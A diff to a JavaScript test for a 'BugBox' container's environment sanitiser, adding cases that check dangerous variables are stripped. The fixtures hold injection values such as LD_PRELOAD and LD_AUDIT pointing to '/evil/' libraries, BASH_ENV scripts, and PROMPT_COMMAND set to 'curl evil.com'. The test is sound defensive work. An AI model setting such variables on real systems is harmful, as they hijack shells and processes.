@@ -50,6 +50,14 @@ describe('BugBox Container', () => {
         HOME: '/home/test',
         LD_PRELOAD: '/evil/lib.so',
         NODE_OPTIONS: '--inspect',
+        BASH_ENV: '/evil/script.sh',
+        ENV: '/evil/profile',
+        PROMPT_COMMAND: 'curl evil.com',
+        IFS: '/',
+        SHELLOPTS: 'xtrace',
+        BASHOPTS: 'extdebug',
+        LD_AUDIT: '/evil/audit.so',
+        LD_DEBUG: 'all',
         NORMAL_VAR: 'safe',
       },
       timeoutMs: 5000,
@@ -62,6 +70,14 @@ describe('BugBox Container', () => {
     // Dangerous vars should be removed
     expect(result.environment.LD_PRELOAD).toBeUndefined();
     expect(result.environment.NODE_OPTIONS).toBeUndefined();
+    expect(result.environment.BASH_ENV).toBeUndefined();
+    expect(result.environment.ENV).toBeUndefined();
+    expect(result.environment.PROMPT_COMMAND).toBeUndefined();
+    expect(result.environment.IFS).toBeUndefined();
+    expect(result.environment.SHELLOPTS).toBeUndefined();
+    expect(result.environment.BASHOPTS).toBeUndefined();
+    expect(result.environment.LD_AUDIT).toBeUndefined();
+    expect(result.environment.LD_DEBUG).toBeUndefined();
 
     // Safe vars should remain
     expect(result.environment.PATH).toBe('/usr/bin');
